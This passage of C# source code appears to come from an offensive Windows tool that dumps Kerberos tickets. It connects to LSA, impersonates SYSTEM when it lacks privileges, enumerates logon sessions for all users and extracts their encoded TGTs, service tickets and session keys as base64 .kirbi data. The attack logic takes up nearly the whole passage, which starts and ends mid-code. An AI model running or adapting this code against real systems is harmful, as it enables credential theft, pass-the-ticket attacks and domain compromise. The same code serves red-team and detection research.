                                                DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                                                DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                                                Int64 timeSkew = response.Ticket.TimeSkew;
                                                Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                                                string ticketFlags = ((Interop.TicketFlags)response.Ticket.TicketFlags).ToString();

                                                // extract the ticket and base64 encode it
                                                byte[] encodedTicket = new byte[encodedTicketSize];
                                                Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                                                string base64TGT = Convert.ToBase64String(encodedTicket);
                                                if (userData != null)
                                                {
                                                    userData.SetValue("ServiceName", serviceName);
                                                    userData.SetValue("TargetName", targetName);
                                                    userData.SetValue("ClientName", clientName);
                                                    userData.SetValue("DomainName", domainName);
                                                    userData.SetValue("TargetDomainName", targetDomainName);
                                                    userData.SetValue("AltTargetDomainName", altTargetDomainName);
                                                    userData.SetValue("SessionKeyType", sessionKeyType);
                                                    userData.SetValue("Base64SessionKey", base64SessionKey);
                                                    userData.SetValue("KeyExpirationTime", keyExpirationTime);
                                                    userData.SetValue("TicketFlags", ticketFlags);
                                                    userData.SetValue("StartTime", startTime);
                                                    userData.SetValue("EndTime", endTime);
                                                    userData.SetValue("RenewUntil", renewUntil);
                                                    userData.SetValue("TimeSkew", timeSkew);
                                                    userData.SetValue("EncodedTicketSize", encodedTicketSize);
                                                    userData.SetValue("Base64EncodedTicket", base64TGT);
                                                }

                                                Console.WriteLine("    ServiceName              : {0}", serviceName);
                                                Console.WriteLine("    TargetName               : {0}", targetName);
                                                Console.WriteLine("    ClientName               : {0}", clientName);
                                                Console.WriteLine("    DomainName               : {0}", domainName);
                                                Console.WriteLine("    TargetDomainName         : {0}", targetDomainName);
                                                Console.WriteLine("    AltTargetDomainName      : {0}", altTargetDomainName);
                                                Console.WriteLine("    SessionKeyType           : {0}", sessionKeyType);
                                                Console.WriteLine("    Base64SessionKey         : {0}", base64SessionKey);
                                                Console.WriteLine("    KeyExpirationTime        : {0}", keyExpirationTime);
                                                Console.WriteLine("    TicketFlags              : {0}", ticketFlags);
                                                Console.WriteLine("    StartTime                : {0}", startTime);
                                                Console.WriteLine("    EndTime                  : {0}", endTime);
                                                Console.WriteLine("    RenewUntil               : {0}", renewUntil);
                                                Console.WriteLine("    TimeSkew                 : {0}", timeSkew);
                                                Console.WriteLine("    EncodedTicketSize        : {0}", encodedTicketSize);
                                                Console.WriteLine("    Base64EncodedTicket      :\r\n");
                                                
                                                // display the TGT, columns of 100 chararacters
                                                foreach (string line in Helpers.Split(base64TGT, 100))
                                                {
                                                    Console.WriteLine("      {0}", line);
                                                }
                                                Console.WriteLine();
                                            }
                                            else
                                            {
                                                string errorMessage = new Win32Exception((int)winError).Message;
                                                Console.WriteLine("\r\n    [X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, serverName, errorMessage);
                                            }

                                            // clean up
                                            Interop.LsaFreeReturnBuffer(responsePointer);
                                            Marshal.FreeHGlobal(unmanagedAddr);
                                        }
                                    }
                                }
                            }

                            // cleanup
                            Interop.LsaFreeReturnBuffer(ticketsPointer);
                            Marshal.FreeHGlobal(tQueryPtr);
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);

                if (!monitor)
                {
                    Console.WriteLine("\r\n\r\n[*] Enumerated {0} total tickets", totalTicketCount);
                }
                Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
            }
        }

        public static void ListKerberosTicketsAllUsers(Interop.LUID targetLuid)
        {
            // lists Kerberos tickets for all users on the system (assuming elevation)

            //  first elevates to SYSTEM and uses LsaRegisterLogonProcessHelper connect to LSA
            //  then calls LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type to enumerate all cached tickets

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Console.WriteLine("\r\n\r\n[*] Action: List Kerberos Tickets (All Users)\r\n");

            if ((ulong)targetLuid != 0)
            {
                Console.WriteLine("[*] Target LUID     : 0x{0:x}", (ulong)targetLuid);
            }

            int retCode;
            int authPack;
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr lsaHandle = LsaRegisterLogonProcessHelper();

            // if the original call fails then it is likely we don't have SeTcbPrivilege
            // to get SeTcbPrivilege we can Impersonate a NT AUTHORITY\SYSTEM Token
            if (lsaHandle == IntPtr.Zero)
            {
                string currentName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                if (currentName == "NT AUTHORITY\\SYSTEM")
                {
                    // if we're already SYSTEM, we have the proper privilegess to get a Handle to LSA with LsaRegisterLogonProcessHelper
                    lsaHandle = LsaRegisterLogonProcessHelper();
                }
                else
                {
                    // elevated but not system, so gotta GetSystem() first
                    Helpers.GetSystem();
                    // should now have the proper privileges to get a Handle to LSA
                    lsaHandle = LsaRegisterLogonProcessHelper();
                    // we don't need our NT AUTHORITY\SYSTEM Token anymore so we can revert to our original token
                    Interop.RevertToSelf();
                }
            }

            try
            {
                // obtains the unique identifier for the kerberos authentication package.
                retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

                // first return all the logon sessions
                DateTime systime = new DateTime(1601, 1, 1, 0, 0, 0, 0); //win32 systemdate
                UInt64 count;
                IntPtr luidPtr = IntPtr.Zero;
                IntPtr iter = luidPtr;

                uint ret = Interop.LsaEnumerateLogonSessions(out count, out luidPtr);  // get an array of pointers to LUIDs

                for (ulong i = 0; i < count; i++)
                {
                    IntPtr sessionData;
                    ret = Interop.LsaGetLogonSessionData(luidPtr, out sessionData);
                    Interop.SECURITY_LOGON_SESSION_DATA data = (Interop.SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(sessionData, typeof(Interop.SECURITY_LOGON_SESSION_DATA));

                    // if we have a valid logon
                    if (data.PSiD != IntPtr.Zero)
                    {
                        // user session data
                        string username = Marshal.PtrToStringUni(data.Username.Buffer).Trim();
                        System.Security.Principal.SecurityIdentifier sid = new System.Security.Principal.SecurityIdentifier(data.PSiD);
                        string domain = Marshal.PtrToStringUni(data.LoginDomain.Buffer).Trim();
                        string authpackage = Marshal.PtrToStringUni(data.AuthenticationPackage.Buffer).Trim();
                        Interop.SECURITY_LOGON_TYPE logonType = (Interop.SECURITY_LOGON_TYPE)data.LogonType;
                        DateTime logonTime = systime.AddTicks((long)data.LoginTime);
                        string logonServer = Marshal.PtrToStringUni(data.LogonServer.Buffer).Trim();
                        string dnsDomainName = Marshal.PtrToStringUni(data.DnsDomainName.Buffer).Trim();
                        string upn = Marshal.PtrToStringUni(data.Upn.Buffer).Trim();

                        IntPtr ticketsPointer = IntPtr.Zero;
                        DateTime sysTime = new DateTime(1601, 1, 1, 0, 0, 0, 0);

                        int returnBufferLength = 0;
                        int protocalStatus = 0;

                        Interop.KERB_QUERY_TKT_CACHE_REQUEST tQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
                        Interop.KERB_QUERY_TKT_CACHE_RESPONSE tickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
                        Interop.KERB_TICKET_CACHE_INFO_EX ticket;

                        // input object for querying the ticket cache for a specific logon ID
                        Interop.LUID userLogonID = new Interop.LUID(data.LoginID);
                        tQuery.LogonId = userLogonID;

                        if (((ulong)targetLuid == 0) || (data.LoginID == targetLuid))
                        {
                            tQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;

                            // query LSA, specifying we want the ticket cache
                            IntPtr tQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(tQuery));
                            Marshal.StructureToPtr(tQuery, tQueryPtr, false);
                            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, tQueryPtr, Marshal.SizeOf(tQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

                            if (ticketsPointer != IntPtr.Zero)
                            {
                                // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
                                tickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
                                int count2 = tickets.CountOfTickets;

                                if (count2 != 0)
                                {
                                    Console.WriteLine("\r\n  UserName                 : {0}", username);
                                    Console.WriteLine("  Domain                   : {0}", domain);
                                    Console.WriteLine("  LogonId                  : {0}", data.LoginID);
                                    Console.WriteLine("  UserSID                  : {0}", sid.Value);
                                    Console.WriteLine("  AuthenticationPackage    : {0}", authpackage);
                                    Console.WriteLine("  LogonType                : {0}", logonType);
                                    Console.WriteLine("  LogonTime                : {0}", logonTime);
                                    Console.WriteLine("  LogonServer              : {0}", logonServer);
                                    Console.WriteLine("  LogonServerDNSDomain     : {0}", dnsDomainName);
                                    Console.WriteLine("  UserPrincipalName        : {0}", upn);
                                    Console.WriteLine();

                                    // get the size of the structures we're iterating over
                                    Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                                    for (int j = 0; j < count2; j++)
                                    {
                                        // iterate through the result structures
                                        IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + j * dataSize)));

                                        // parse the new ptr to the appropriate structure
                                        ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                                        DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                                        DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                                        DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);

                                        string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                                        // extract the server name/realm and client name/realm
                                        string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
                                        string serverRealm = Marshal.PtrToStringUni(ticket.ServerRealm.Buffer, ticket.ServerRealm.Length / 2);
                                        string clientName = Marshal.PtrToStringUni(ticket.ClientName.Buffer, ticket.ClientName.Length / 2);
                                        string clientRealm = Marshal.PtrToStringUni(ticket.ClientRealm.Buffer, ticket.ClientRealm.Length / 2);

                                        Console.WriteLine("    [{0:x}] - 0x{1:x} - {2}", j, (int)ticket.EncryptionType, (Interop.KERB_ETYPE)ticket.EncryptionType);
                                        Console.WriteLine("      Start/End/MaxRenew: {0} ; {1} ; {2}", startTime, endTime, renewTime);
                                        Console.WriteLine("      Server Name       : {0} @ {1}", serverName, serverRealm);
                                        Console.WriteLine("      Client Name       : {0} @ {1}", clientName, clientRealm);
                                        Console.WriteLine("      Flags             : {0} ({1:x})", ticketFlags, ticket.TicketFlags);
                                        Console.WriteLine();
                                    }
                                }
                            }

                            // cleanup
                            Interop.LsaFreeReturnBuffer(ticketsPointer);
                            Marshal.FreeHGlobal(tQueryPtr);
                        }
                    }

                    // move the pointer forward
                    luidPtr = (IntPtr)((long)luidPtr.ToInt64() + Marshal.SizeOf(typeof(Interop.LUID)));

                    // cleaup
                    Interop.LsaFreeReturnBuffer(sessionData);
                }
                Interop.LsaFreeReturnBuffer(luidPtr);

                // disconnect from LSA
                Interop.LsaDeregisterLogonProcess(lsaHandle);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex);
            }
        }

        public static void ListKerberosTicketDataCurrentUser(string targetService)
        {
            // extracts Kerberos ticket data for the current user

            //  first uses LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
            //  to enumerate all cached tickets, then uses LsaCallAuthenticationPackage w/ a KerbRetrieveEncodedTicketMessage message type
            //  to extract the Kerberos ticket data in .kirbi format (service tickets and TGTs)

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Console.WriteLine("\r\n\r\n[*] Action: Dump Kerberos Ticket Data (Current User)\r\n");

            Interop.LUID currentLUID = GetCurrentLUID();
            Console.WriteLine("[*] Current LUID    : {0}\r\n", currentLUID);

            if (!String.IsNullOrEmpty(targetService))
            {
                Console.WriteLine("[*] Target service  : {0:x}\r\n\r\n", targetService);
            }

            int totalTicketCount = 0;
            int extractedTicketCount = 0;
            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr ticketsPointer = IntPtr.Zero;
            int authPack;
            int returnBufferLength = 0;
            int protocalStatus = 0;
            IntPtr lsaHandle;
            int retCode;

            // If we want to look at tickets from a session other than our own
            //      then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
            retCode = Interop.LsaConnectUntrusted(out lsaHandle);

            // obtains the unique identifier for the kerberos authentication package.
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
            Interop.KERB_TICKET_CACHE_INFO ticket;

            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
            cacheQuery.LogonId = new Interop.LUID();
            cacheQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheMessage;

            // query LSA, specifying we want the ticket cache
            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheQueryPtr, Marshal.SizeOf(cacheQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
            int count = cacheTickets.CountOfTickets;
            Console.WriteLine("[*] Returned {0} tickets\r\n", count);
            totalTicketCount += count;

            // get the size of the structures we're iterating over
            Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO));

            for (int i = 0; i < count; i++)
            {
                // iterate through the result structures
                IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + i * dataSize)));

                // parse the new ptr to the appropriate structure
                ticket = (Interop.KERB_TICKET_CACHE_INFO)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO));

                // extract the serverName and ticket flags
                string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);

                if (String.IsNullOrEmpty(targetService) || (Regex.IsMatch(serverName, String.Format(@"^{0}/.*", targetService), RegexOptions.IgnoreCase)))
                {
                    extractedTicketCount++;

                    // now we have to call LsaCallAuthenticationPackage() again with the specific server target
                    IntPtr responsePointer = IntPtr.Zero;
                    Interop.KERB_RETRIEVE_TKT_REQUEST request = new Interop.KERB_RETRIEVE_TKT_REQUEST();
                    Interop.KERB_RETRIEVE_TKT_RESPONSE response = new Interop.KERB_RETRIEVE_TKT_RESPONSE();

                    // signal that we want encoded .kirbi's returned
                    request.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbRetrieveEncodedTicketMessage;
                    request.LogonId = new Interop.LUID();
                    request.TicketFlags = ticket.TicketFlags;
                    request.CacheOptions = 0x8; // KERB_CACHE_OPTIONS.KERB_RETRIEVE_TICKET_AS_KERB_CRED
                    request.EncryptionType = 0x0;
                    // the target ticket name we want the ticket for
                    Interop.UNICODE_STRING tName = new Interop.UNICODE_STRING(serverName);
                    request.TargetName = tName;

                    // the following is due to the wonky way LsaCallAuthenticationPackage wants the KERB_RETRIEVE_TKT_REQUEST
                    //      for KerbRetrieveEncodedTicketMessages

                    // create a new unmanaged struct of size KERB_RETRIEVE_TKT_REQUEST + target name max len
                    int structSize = Marshal.SizeOf(typeof(Interop.KERB_RETRIEVE_TKT_REQUEST));
                    int newStructSize = structSize + tName.MaximumLength;
                    IntPtr unmanagedAddr = Marshal.AllocHGlobal(newStructSize);

                    // marshal the struct from a managed object to an unmanaged block of memory.
                    Marshal.StructureToPtr(request, unmanagedAddr, false);

                    // set tName pointer to end of KERB_RETRIEVE_TKT_REQUEST
                    IntPtr newTargetNameBuffPtr = (IntPtr)((long)(unmanagedAddr.ToInt64() + (long)structSize));

                    // copy unicode chars to the new location
                    Interop.CopyMemory(newTargetNameBuffPtr, tName.buffer, tName.MaximumLength);

                    // update the target name buffer ptr            
                    Marshal.WriteIntPtr(unmanagedAddr, IntPtr.Size==8?24:16, newTargetNameBuffPtr);

                    // actually get the data
                    retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, unmanagedAddr, newStructSize, out responsePointer, out returnBufferLength, out protocalStatus);

                    // translate the LSA error (if any) to a Windows error
                    uint winError = Interop.LsaNtStatusToWinError((uint)protocalStatus);

                    if ((retCode == 0) && ((uint)winError == 0) && (returnBufferLength != 0))
                    {
                        // parse the returned pointer into our initial KERB_RETRIEVE_TKT_RESPONSE structure
                        response = (Interop.KERB_RETRIEVE_TKT_RESPONSE)Marshal.PtrToStructure((System.IntPtr)responsePointer, typeof(Interop.KERB_RETRIEVE_TKT_RESPONSE));

                        string serviceName = "";
                        if (response.Ticket.ServiceName != IntPtr.Zero)
                        {
                            Interop.KERB_EXTERNAL_NAME serviceNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ServiceName, typeof(Interop.KERB_EXTERNAL_NAME));
                            if (serviceNameStruct.NameCount == 1)
                            {
                                string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                                serviceName = serviceNameStr1;
                            }
                            else if (serviceNameStruct.NameCount == 2)
                            {
                                string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                                string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                                serviceName = String.Format("{0}/{1}", serviceNameStr1, serviceNameStr2);
                            }
                            else if (serviceNameStruct.NameCount == 3)
                            {
                                string serviceNameStr1 = Marshal.PtrToStringUni(serviceNameStruct.Names[0].Buffer, serviceNameStruct.Names[0].Length / 2).Trim();
                                string serviceNameStr2 = Marshal.PtrToStringUni(serviceNameStruct.Names[1].Buffer, serviceNameStruct.Names[1].Length / 2).Trim();
                                string serviceNameStr3 = Marshal.PtrToStringUni(serviceNameStruct.Names[2].Buffer, serviceNameStruct.Names[2].Length / 2).Trim();
                                serviceName = String.Format("{0}/{1}/{2}", serviceNameStr1, serviceNameStr2, serviceNameStr3);
                            }
                            else { }
                        }


                        string targetName = "";
                        if (response.Ticket.TargetName != IntPtr.Zero)
                        {
                            Interop.KERB_EXTERNAL_NAME targetNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.TargetName, typeof(Interop.KERB_EXTERNAL_NAME));
                            if (targetNameStruct.NameCount == 1)
                            {
                                string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                targetName = targetNameStr1;
                            }
                            else if (targetNameStruct.NameCount == 2)
                            {
                                string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                                targetName = String.Format("{0}/{1}", targetNameStr1, targetNameStr2);
                            }
                            else if (targetNameStruct.NameCount == 3)
                            {
                                string targetNameStr1 = Marshal.PtrToStringUni(targetNameStruct.Names[0].Buffer, targetNameStruct.Names[0].Length / 2).Trim();
                                string targetNameStr2 = Marshal.PtrToStringUni(targetNameStruct.Names[1].Buffer, targetNameStruct.Names[1].Length / 2).Trim();
                                string targetNameStr3 = Marshal.PtrToStringUni(targetNameStruct.Names[2].Buffer, targetNameStruct.Names[2].Length / 2).Trim();
                                targetName = String.Format("{0}/{1}/{2}", targetNameStr1, targetNameStr2, targetNameStr3);
                            }
                            else { }
                        }


                        string clientName = "";
                        if (response.Ticket.ClientName != IntPtr.Zero)
                        {
                            Interop.KERB_EXTERNAL_NAME clientNameStruct = (Interop.KERB_EXTERNAL_NAME)Marshal.PtrToStructure(response.Ticket.ClientName, typeof(Interop.KERB_EXTERNAL_NAME));
                            if (clientNameStruct.NameCount == 1)
                            {
                                string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                                clientName = clientNameStr1;
                            }
                            else if (clientNameStruct.NameCount == 2)
                            {
                                string clientNameStr1 = Marshal.PtrToStringUni(clientNameStruct.Names[0].Buffer, clientNameStruct.Names[0].Length / 2).Trim();
                                string clientNameStr2 = Marshal.PtrToStringUni(clientNameStruct.Names[1].Buffer, clientNameStruct.Names[1].Length / 2).Trim();
                                clientName = String.Format("{0}@{1}", clientNameStr1, clientNameStr2);
                            }
                            else { }
                        }


                        string domainName = Marshal.PtrToStringUni(response.Ticket.DomainName.Buffer, response.Ticket.DomainName.Length / 2).Trim();
                        string targetDomainName = Marshal.PtrToStringUni(response.Ticket.TargetDomainName.Buffer, response.Ticket.TargetDomainName.Length / 2).Trim();
                        string altTargetDomainName = Marshal.PtrToStringUni(response.Ticket.AltTargetDomainName.Buffer, response.Ticket.AltTargetDomainName.Length / 2).Trim();

                        // extract the session key
                        Interop.KERB_ETYPE sessionKeyType = (Interop.KERB_ETYPE)response.Ticket.SessionKey.KeyType;
                        Int32 sessionKeyLength = response.Ticket.SessionKey.Length;
                        byte[] sessionKey = new byte[sessionKeyLength];
                        Marshal.Copy(response.Ticket.SessionKey.Value, sessionKey, 0, sessionKeyLength);
                        string base64SessionKey = Convert.ToBase64String(sessionKey);

                        DateTime keyExpirationTime = DateTime.FromFileTime(response.Ticket.KeyExpirationTime);
                        DateTime startTime = DateTime.FromFileTime(response.Ticket.StartTime);
                        DateTime endTime = DateTime.FromFileTime(response.Ticket.EndTime);
                        DateTime renewUntil = DateTime.FromFileTime(response.Ticket.RenewUntil);
                        Int64 timeSkew = response.Ticket.TimeSkew;
                        Int32 encodedTicketSize = response.Ticket.EncodedTicketSize;

                        string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                        // extract the ticket and base64 encode it
                        byte[] encodedTicket = new byte[encodedTicketSize];
                        Marshal.Copy(response.Ticket.EncodedTicket, encodedTicket, 0, encodedTicketSize);
                        string base64TGT = Convert.ToBase64String(encodedTicket);

                        Console.WriteLine("  ServiceName              : {0}", serviceName);
                        Console.WriteLine("  TargetName               : {0}", targetName);
                        Console.WriteLine("  ClientName               : {0}", clientName);
                        Console.WriteLine("  DomainName               : {0}", domainName);
                        Console.WriteLine("  TargetDomainName         : {0}", targetDomainName);
                        Console.WriteLine("  AltTargetDomainName      : {0}", altTargetDomainName);
                        Console.WriteLine("  SessionKeyType           : {0}", sessionKeyType);
                        Console.WriteLine("  Base64SessionKey         : {0}", base64SessionKey);
                        Console.WriteLine("  KeyExpirationTime        : {0}", keyExpirationTime);
                        Console.WriteLine("  TicketFlags              : {0}", ticketFlags);
                        Console.WriteLine("  StartTime                : {0}", startTime);
                        Console.WriteLine("  EndTime                  : {0}", endTime);
                        Console.WriteLine("  RenewUntil               : {0}", renewUntil);
                        Console.WriteLine("  TimeSkew                 : {0}", timeSkew);
                        Console.WriteLine("  EncodedTicketSize        : {0}", encodedTicketSize);
                        Console.WriteLine("  Base64EncodedTicket      :\r\n");
                        // display the TGT, columns of 100 chararacters
                        foreach (string line in Helpers.Split(base64TGT, 100))
                        {
                            Console.WriteLine("    {0}", line);
                        }
                        Console.WriteLine("\r\n");
                    }
                    else
                    {
                        string errorMessage = new Win32Exception((int)winError).Message;
                        Console.WriteLine("\r\n[X] Error {0} calling LsaCallAuthenticationPackage() for target \"{1}\" : {2}", winError, serverName, errorMessage);
                    }

                    // clean up
                    Interop.LsaFreeReturnBuffer(responsePointer);
                    Marshal.FreeHGlobal(unmanagedAddr);
                }
            }

            // clean up
            Interop.LsaFreeReturnBuffer(ticketsPointer);
            Marshal.FreeHGlobal(cacheQueryPtr);

            // disconnect from LSA
            Interop.LsaDeregisterLogonProcess(lsaHandle);

            Console.WriteLine("\r\n\r\n[*] Enumerated {0} total tickets", totalTicketCount);
            Console.WriteLine("[*] Extracted  {0} total tickets\r\n", extractedTicketCount);
        }

        public static void ListKerberosTicketsCurrentUser()
        {
            // lists Kerberos tickets for the current user

            //  first uses LsaConnectUntrusted to connect and LsaCallAuthenticationPackage w/ a KerbQueryTicketCacheMessage message type
            //  to enumerate all cached tickets

            // adapted partially from Vincent LE TOUX' work
            //      https://github.com/vletoux/MakeMeEnterpriseAdmin/blob/master/MakeMeEnterpriseAdmin.ps1#L2939-L2950
            // and https://www.dreamincode.net/forums/topic/135033-increment-memory-pointer-issue/
            // also Jared Atkinson's work at https://github.com/Invoke-IR/ACE/blob/master/ACE-Management/PS-ACE/Scripts/ACE_Get-KerberosTicketCache.ps1

            Console.WriteLine("\r\n\r\n[*] Action: List Kerberos Tickets (Current User)\r\n");

            Interop.LUID currentLUID = GetCurrentLUID();
            Console.WriteLine("[*] Current LUID    : {0}\r\n", currentLUID);

            string name = "kerberos";
            Interop.LSA_STRING_IN LSAString;
            LSAString.Length = (ushort)name.Length;
            LSAString.MaximumLength = (ushort)(name.Length + 1);
            LSAString.Buffer = name;

            IntPtr ticketsPointer = IntPtr.Zero;
            int authPack;
            int returnBufferLength = 0;
            int protocalStatus = 0;
            IntPtr lsaHandle;
            int retCode;

            // If we want to look at tickets from a session other than our own
            //      then we need to use LsaRegisterLogonProcess instead of LsaConnectUntrusted
            retCode = Interop.LsaConnectUntrusted(out lsaHandle);

            // obtains the unique identifier for the kerberos authentication package.
            retCode = Interop.LsaLookupAuthenticationPackage(lsaHandle, ref LSAString, out authPack);

            Interop.KERB_QUERY_TKT_CACHE_REQUEST cacheQuery = new Interop.KERB_QUERY_TKT_CACHE_REQUEST();
            Interop.KERB_QUERY_TKT_CACHE_RESPONSE cacheTickets = new Interop.KERB_QUERY_TKT_CACHE_RESPONSE();
            Interop.KERB_TICKET_CACHE_INFO_EX ticket;

            // input object for querying the ticket cache (https://docs.microsoft.com/en-us/windows/desktop/api/ntsecapi/ns-ntsecapi-_kerb_query_tkt_cache_request)
            cacheQuery.LogonId = new Interop.LUID();
            cacheQuery.MessageType = Interop.KERB_PROTOCOL_MESSAGE_TYPE.KerbQueryTicketCacheExMessage;

            // query LSA, specifying we want the ticket cache
            IntPtr cacheQueryPtr = Marshal.AllocHGlobal(Marshal.SizeOf(cacheQuery));
            Marshal.StructureToPtr(cacheQuery, cacheQueryPtr, false);
            retCode = Interop.LsaCallAuthenticationPackage(lsaHandle, authPack, cacheQueryPtr, Marshal.SizeOf(cacheQuery), out ticketsPointer, out returnBufferLength, out protocalStatus);

            // parse the returned pointer into our initial KERB_QUERY_TKT_CACHE_RESPONSE structure
            cacheTickets = (Interop.KERB_QUERY_TKT_CACHE_RESPONSE)Marshal.PtrToStructure((System.IntPtr)ticketsPointer, typeof(Interop.KERB_QUERY_TKT_CACHE_RESPONSE));
            int count = cacheTickets.CountOfTickets;

            // get the size of the structures we're iterating over
            Int32 dataSize = Marshal.SizeOf(typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

            for (int i = 0; i < count; i++)
            {
                // iterate through the result structures
                IntPtr currTicketPtr = (IntPtr)(long)((ticketsPointer.ToInt64() + (int)(8 + i * dataSize)));

                // parse the new ptr to the appropriate structure
                ticket = (Interop.KERB_TICKET_CACHE_INFO_EX)Marshal.PtrToStructure(currTicketPtr, typeof(Interop.KERB_TICKET_CACHE_INFO_EX));

                DateTime startTime = DateTime.FromFileTime(ticket.StartTime);
                DateTime endTime = DateTime.FromFileTime(ticket.EndTime);
                DateTime renewTime = DateTime.FromFileTime(ticket.RenewTime);

                string ticketFlags = ((Interop.TicketFlags)ticket.TicketFlags).ToString();

                // extract the server name/realm and client name/realm
                string serverName = Marshal.PtrToStringUni(ticket.ServerName.Buffer, ticket.ServerName.Length / 2);
